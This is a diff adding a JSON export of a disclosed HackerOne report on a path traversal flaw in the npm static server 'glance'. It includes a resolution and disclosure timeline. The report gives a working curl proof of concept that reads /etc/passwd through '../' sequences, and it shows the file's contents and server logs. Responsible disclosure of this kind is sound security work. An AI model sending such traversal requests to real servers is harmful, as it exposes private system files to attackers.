+            "id": 2343252, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bl4de", 
+                "url": "/bl4de"
+            }, 
+            "created_at": "2018-02-01T22:17:27.542Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T22:17:27.542Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 2343253, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-01T22:28:49.015Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-01T22:28:49.015Z", 
+            "actor": {
+                "username": "jarofghosts", 
+                "url": "/jarofghosts", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "I'm fine with the disclosure!", 
+            "markdown_message": "<p>I&#39;m fine with the disclosure!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2343281, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T08:38:13.857Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T08:38:13.857Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Hi @lirantal ,\n\nYes, I am fine as well\n", 
+            "markdown_message": "<p>Hi <a href=\"/lirantal\">@lirantal</a> ,</p>\n\n<p>Yes, I am fine as well</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2344435, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T11:54:30.037Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T11:54:30.037Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "Great, I'll take care of disclosing it in time then, thank you both!", 
+            "markdown_message": "<p>Great, I&#39;ll take care of disclosing it in time then, thank you both!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2344894, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-02-02T11:54:45.402Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-02-02T11:54:45.402Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 2344896, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-03-04T11:54:56.538Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-04T11:54:56.538Z", 
+            "actor": {
+                "url": "/nodejs-ecosystem", 
+                "profile": {
+                    "name": "Node.js third-party modules"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+                }
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 2455409, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "old_scope": "Other module", 
+            "created_at": "2018-03-09T14:30:10.407Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-03-09T14:30:10.407Z", 
+            "actor": {
+                "username": "lirantal", 
+                "url": "/lirantal", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/096/045/01f6fd0d814d80d025eb8a0dcb5292f042739569_medium.jpeg?1515169110"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "nodejs-ecosystem", 
+            "new_scope": "glance", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ChangedScope", 
+            "id": 2477206, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bl4de", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bl4de", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 19, 
+        "name": "Path Traversal"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -23970702.197369672, 
+    "disclosed_at": "2018-03-04T11:54:56.505Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/310106", 
+    "created_at": "2018-01-29T10:34:13.032Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Hi Guys,</p>\n\n<p>There is Path Traversal vulnerability in <code>glance</code> module. This issue allows to read arbitrary files from the server, where <code>glance</code> is installed.</p>\n\n<h2 id=\"module\">Module</h2>\n\n<p><strong>glance</strong></p>\n\n<p>a quick disposable http server for static files</p>\n\n<p><a title=\"https://www.npmjs.com/package/glance\" href=\"/redirect?signature=a00416ffdecf4198aebe10c315915e053160eab0&amp;url=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fglance\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.npmjs.com/package/glance</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Stats<br>\n33 downloads in the last day<br>\n34 downloads in the last week<br>\n269 downloads in the last month</p>\n\n<p>~3000 estimated downloads per year</p>\n\n<h2 id=\"description\">Description</h2>\n\n<p><code>glance</code> serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple <code>curl</code> command (adjust number of ../ to reflect your system):</p>\n<pre class=\"highlight plaintext\"><code>curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n</code></pre>\n<p>The result:</p>\n<pre class=\"highlight plaintext\"><code>me:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n&gt; GET /../../../../../../etc/passwd HTTP/1.1\n&gt; Host: 127.0.0.1:8080\n&gt; User-Agent: curl/7.47.0\n&gt; Accept: */*\n&gt; \n&lt; HTTP/1.1 200 OK\n&lt; content-type: application/octet-stream\n&lt; etag: 6d51e6677c898282619137b0c74f0cab\n&lt; last-modified: Fri, 26 Jan 2018 12:04:19 +0000\n&lt; content-length: 2559\n&lt; Date: Mon, 29 Jan 2018 10:23:45 GMT\n&lt; Connection: keep-alive\n&lt; \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n(..)\nguest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash\npostgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n* Connection #0 to host 127.0.0.1 left intact\nme:~/playground/hackerone/Node$\n</code></pre>\n<h2 id=\"steps-to-reproduce\">Steps To Reproduce:</h2>\n\n<ul>\n<li>install <code>glance</code>:</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>$ npm install glance\n</code></pre>\n<ul>\n<li>run <code>glance</code> in direcotry of your choice</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/\nglance serving node_modules/ on port 8080\n::1 read node_modules/\n::1 read node_modules/bash-color/\n::1 read node_modules/bash-color/README.md\n::1 read ./\n::1 read malware_frame.html\n::1 read malware.js\nERR404 ::ffff:127.0.0.1 on ../../../etc/passwd\nERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd\n::ffff:127.0.0.1 read ../../../../../etc/passwd\n::ffff:127.0.0.1 read ../../../../../etc/passwd\n</code></pre>\n<p>You can see in the log above all my requests sent to <code>glance</code>, including <code>curl</code> requests from PoC, where I was able to traverse directory tree and read content of <code>/etc/passwd</code> file</p>\n\n<h2 id=\"supporting-material-references\">Supporting Material/References:</h2>\n\n<ul>\n<li>Ubuntu 16.04 LTS</li>\n<li>Chromium 66.0.3333.0 (Developer Build) (64-bit) </li>\n<li>Node.js version: v8.9.4 LTS</li>\n<li>npm version: 5.6.0</li>\n<li>curl 7.47.0</li>\n</ul>\n\n<p>Please feel free to invite module maintainer to this report. I haven&#39;t contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.</p>\n\n<p>I hope my report will help to keep Node.js ecosystem and its users safe in the future.</p>\n\n<p>Regards,</p>\n\n<p>Rafal &#39;bl4de&#39; Janicki</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>This vulnerability allows malicious user to read content of arbitrary file from the server.</p>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://nodejs.org/en/security/", 
+            "about": "This program is used to handle vulnerabilities in the Node.js ecosystem.", 
+            "twitter_handle": "", 
+            "name": "Node.js third-party modules"
+        }, 
+        "handle": "nodejs-ecosystem", 
+        "url": "https://hackerone.com/nodejs-ecosystem", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/023/949/309112251b444244d95977d1299148aae6482789_small.?1508679627", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/023/949/c1f5f15ac094c1327c13dd19f55dbcb7411272bd_medium.?1508679627"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 23949, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
